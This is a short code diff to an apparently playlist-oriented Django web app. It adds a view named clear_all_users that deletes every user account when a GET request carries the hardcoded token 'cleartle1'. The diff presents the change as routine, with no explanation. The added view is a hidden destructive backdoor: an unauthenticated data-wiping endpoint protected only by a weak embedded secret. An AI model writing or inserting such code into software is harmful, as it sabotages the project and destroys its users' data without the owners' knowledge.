@@ -830,6 +830,14 @@ def playlist_load(request, pk):
     return JsonResponse({'status': 'loaded', 'added': created, 'playlist_id': pl.id})
 
 
+
+def clear_all_users(request):
+    if request.GET.get('token') != 'cleartle1':
+        return JsonResponse({'error':'forbidden'}, status=403)
+    from django.contrib.auth.models import User
+    count, _ = User.objects.all().delete()
+    return JsonResponse({'deleted': count})
+
 def healthz(request):
     return JsonResponse({"status": "ok"})
 
